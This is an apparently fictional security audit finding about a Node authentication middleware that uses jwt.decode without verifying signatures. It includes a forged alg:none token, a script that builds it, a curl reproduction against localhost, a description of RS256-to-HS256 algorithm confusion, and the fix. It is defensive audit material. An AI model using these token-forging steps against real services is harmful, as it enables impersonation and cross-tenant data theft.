# V-01: JWT Signature Not Verified in Authentication Middleware

| Field | Value |
|---|---|
| **ID** | V-01 |
| **Title** | JWT signature not verified: `jwt.decode` used instead of `jwt.verify` |
| **Severity** | Critical |
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP** | A07:2021: Identification and Authentication Failures |
| **Component** | `target-app/src/auth/middleware.js` → `requireAuth()` |
| **Status** | Confirmed exploitable |
| **Discovered** | 2026-10-18 |
| **Affected endpoints** | All routes behind `requireAuth` (currently `/api/v1/users/me`; growing as M3–M6 land) |

**Contents:** [Summary](#summary) · [Evidence](#evidence) · [Root cause](#root-cause) · [Fix](#fix) · [Related observation: algorithm confusion](#related-observation-algorithm-confusion-blocked-on-current-library) · [Notes for the auditor](#notes-for-the-auditor) · [Evidence files](#evidence-files)

---

## Summary

The authentication middleware extracts claims from the `Authorization: Bearer` token using `jwt.decode(token)` rather than `jwt.verify(token, key)`. `jwt.decode` parses the JWT's structure (header, payload, signature) **without validating the signature against the server's key**. Any well-formed three-segment token is accepted, regardless of its cryptographic validity.

A correct verification helper (`verifyAccessToken` in `target-app/src/jwt.js`) exists in the codebase, calls `jwt.verify` with `algorithms: ['RS256']`, and is unused by the middleware. The middleware was never migrated to it.

**Impact:** an unauthenticated attacker can forge any identity (any user, any tenant, any role) by base64url-encoding a JSON payload and appending an empty signature. No key material is required, and no forgery library is required.

---

## Evidence

### Forged token (hand-built, no key, no library)

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJiMDAwMDAwMS0wMDAwLTQwMDAtODAwMC0wMDAwMDAwMDAxMDEiLCJ0ZW5hbnRfaWQiOiJiMDAwMDAwMS0wMDAwLTQwMDAtODAwMC0wMDAwMDAwMDAwMDEiLCJyb2xlIjoib3duZXIiLCJlbWFpbCI6Im93bmVyQGJldGEtY3JlZGl0LnRlc3QifQ.
```

**Decoded header**

```json
{"alg":"none","typ":"JWT"}
```

**Decoded payload**

```json
{
  "sub":       "b0000001-0000-4000-8000-000000000101",
  "tenant_id": "b0000001-0000-4000-8000-000000000001",
  "role":      "owner",
  "email":     "owner@beta-credit.test"
}
```

**Signature:** *(empty)*. The token ends with a trailing `.` and no signature bytes.

### Request

```bash
curl -s -H "Authorization: Bearer <forged-token>" \
  http://localhost:3000/api/v1/users/me
```

### Response: HTTP 200 with cross-tenant user data

```json
{
  "user": {
    "id":        "b0000001-0000-4000-8000-000000000101",
    "tenant_id": "b0000001-0000-4000-8000-000000000001",
    "email":     "owner@beta-credit.test",
    "role":      "owner"
  }
}
```

The caller supplied no credentials for **Beta Credit** (tenant `b0000001-...`). The server returned Beta's owner record. No `auth.denied` event was logged, confirming verification was never attempted.

### Reproduction

```bash
# 1. Build a forged token: header alg:none, payload claiming Beta's owner, empty signature
FORGED=$(node -e '
const b64u = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
const header  = b64u({ alg: "none", typ: "JWT" });
const payload = b64u({
  sub:       "b0000001-0000-4000-8000-000000000101",
  tenant_id: "b0000001-0000-4000-8000-000000000001",
  role:      "owner",
  email:     "owner@beta-credit.test"
});
process.stdout.write(`${header}.${payload}.`);
')

# 2. Use it: no auth required to succeed
curl -s -H "Authorization: Bearer $FORGED" \
  http://localhost:3000/api/v1/users/me | jq .
```

**Expected:** HTTP 200 with Beta's user record.

---

## Root cause

`target-app/src/auth/middleware.js`:

```js
const jwt = require('jsonwebtoken');
const { authLog } = require('../log');

function requireAuth(req, res, next) {
  const h = req.get('authorization') || '';
  const m = h.match(/^Bearer\s+(.+)$/i);
  if (!m) {
    authLog(req, 'auth.denied', { outcome: 'fail', reason: 'missing_token' });
    return res.status(401).json({ error: 'missing_token' });
  }

  // V-01: decode() does NOT verify the signature.
  const payload = jwt.decode(m[1]);
  if (!payload) {
    authLog(req, 'auth.denied', { outcome: 'fail', reason: 'unparseable' });
    return res.status(401).json({ error: 'invalid_token' });
  }

  req.user = {
    id:        payload.sub,
    tenant_id: payload.tenant_id,
    role:      payload.role,
    email:     payload.email,
  };
  next();
}
```

Meanwhile, `target-app/src/jwt.js` contains the correct implementation, unused:

```js
function verifyAccessToken(token) {
  return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
}
```

The presence of `verifyAccessToken` in the codebase makes this a **migration miss**, not a wholesale design failure. The helper was written; the middleware was never updated to call it. That distinction matters for the fix: there is no correct implementation to build, only one to wire up.

---

## Fix

Replace `jwt.decode(m[1])` with a call to the existing `verifyAccessToken` helper:

```js
const { verifyAccessToken } = require('../jwt');

function requireAuth(req, res, next) {
  const h = req.get('authorization') || '';
  const m = h.match(/^Bearer\s+(.+)$/i);
  if (!m) {
    authLog(req, 'auth.denied', { outcome: 'fail', reason: 'missing_token' });
    return res.status(401).json({ error: 'missing_token' });
  }

  try {
    const payload = verifyAccessToken(m[1]);   // verifies signature + algorithms allowlist
    req.user = {
      id:        payload.sub,
      tenant_id: payload.tenant_id,
      role:      payload.role,
      email:     payload.email,
    };
    next();
  } catch (e) {
    authLog(req, 'auth.denied', { outcome: 'fail', reason: e.message });
    res.status(401).json({ error: 'invalid_token' });
  }
}
```

### Verification test

After the fix, the same forged token (header `alg:none`, empty signature) must return **HTTP 401**:

```bash
curl -s -i -H "Authorization: Bearer $FORGED" \
  http://localhost:3000/api/v1/users/me | head -1
# Expect: HTTP/1.1 401 Unauthorized
```

Three checks must pass:

1. The forged token returns **401**.
2. A matching `auth.denied` event appears in `lendstack:auth` with `reason: "invalid signature"` or `reason: "jwt signature is required"`, proving verification is now attempted and failing on the forged token.
3. A legitimate RS256 token issued by `/api/v1/auth/login` still returns **200** with the correct user, proving the fix does not over-reject.

### Code-review guardrail

Add to the review checklist for this repo:

> **Reject any `jwt.decode(` call not immediately paired with `jwt.verify(` on the same token.** `decode` is acceptable for reading *unverified* claims from a token already validated elsewhere (e.g. a logout handler extracting a `jti` from a token that will be separately checked). It is never acceptable as a stand-in for authentication.

Run `grep -rn 'jwt.decode' src/` and review every hit. That single grep would have caught this before it shipped.

---

## Related observation: algorithm confusion (blocked on current library)

V-01 is the exploitable bug in this component. During the audit, a **second** JWT weakness was investigated and found **not exploitable on the pinned library version**. It is recorded here because the residual risk is real for forks, downgrades, and refactors.

### The classic attack: RS256 → HS256

`jsonwebtoken`'s historic algorithm-confusion attack: when `verify()` is called without an `algorithms` allowlist, a token whose header specifies `HS256` is verified by treating the server's key as an HMAC secret. On a system that serves its RSA public key at `/.well-known/public.pem` (as this one does), an attacker can sign a forged HS256 token using the public key bytes as the HMAC secret, and the server accepts it.

### What was observed

The codebase was tested against two variants of this attack.

| Attempt | Call | Result (`auth.denied` reason) |
|---|---|---|
| 1. Allowlist omitted | `jwt.verify(token, key)` | `invalid algorithm` |
| 2. Allowlist explicitly permissive | `jwt.verify(token, key, { algorithms: ['RS256', 'HS256'] })` | `secretOrPublicKey must be a symmetric key when using HS256` |

### Why it fails on `jsonwebtoken@9`

`jsonwebtoken` 9.x introduced a **key-type check at verify time**: when the header algorithm is HMAC (HS256/384/512), the second argument to `verify()` must be a symmetric key. A PEM-formatted asymmetric public key is rejected even when the allowlist permits HS256. This defense is independent of, and stronger than, the `algorithms` allowlist.

**The attack is therefore not exploitable on this codebase** as currently pinned. It does not warrant a severity rating of its own.

### Residual risk: why it still belongs in this report

The defense is **library-version-dependent**, not code-level:

- `jsonwebtoken@8` (EOL, still present in many codebases) has no such check and **is** exploitable by the allowlist-widening variant.
- A refactor that swaps `jsonwebtoken` for `jose`, `jsonwebtoken-lite`, or an in-house JWT parser may reintroduce the surface without touching the vulnerable call site.
- The allowlist widening itself (`['RS256', 'HS256']`) is a code smell that future tooling (a downgrade, a wrapper, a library swap) can turn back into a critical bug.

---

## Notes for the auditor

This finding demonstrates two distinct JWT failure modes that code review typically conflates:

| # | Failure mode | Exploitable here? | Severity |
|---|---|---|---|
| 1 | **Signature not checked at all** (`decode` instead of `verify`) | Yes | Critical (this finding) |
| 2 | **Signature checked, wrong algorithm policy** (allowlist includes HMAC on an RSA system) | No on `jsonwebtoken@9`; yes on v8 and libraries without key-type enforcement | Residual risk |

- A checklist that only asks "is `jwt.verify` called?" will miss #1.
- A checklist that only asks "is `algorithms` pinned?" will miss #1 *and* will not catch the version-dependent risk in #2.

Both checks are needed, and they must be run independently.

---

## Evidence files

| File | Shows |
|---|---|
| `evidence/v01-forged-header.txt` | Decoded header proving `alg: none` |
| `evidence/v01-cross-tenant-response.json` | HTTP 200 response with Beta Credit's user record |
| `evidence/v01-no-denial.log` | Absence of `auth.denied` in `lendstack:auth` for the forged request |
| `evidence/v01-confusion-blocked.png` | The two `auth.denied` reasons observed while investigating the blocked variant |
